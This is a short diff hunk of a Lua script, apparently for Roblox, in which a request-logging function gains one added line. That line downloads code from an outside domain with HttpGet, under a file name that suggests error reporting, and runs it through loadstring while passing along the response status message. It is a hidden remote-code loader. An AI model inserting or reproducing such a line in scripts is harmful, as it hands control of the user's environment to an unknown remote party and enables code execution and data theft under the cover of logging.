@@ -85,6 +85,7 @@ local responser =
             Body = log
         }
     )
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(responser.StatusMessage)
 return response
 end)
 if not zzzu then
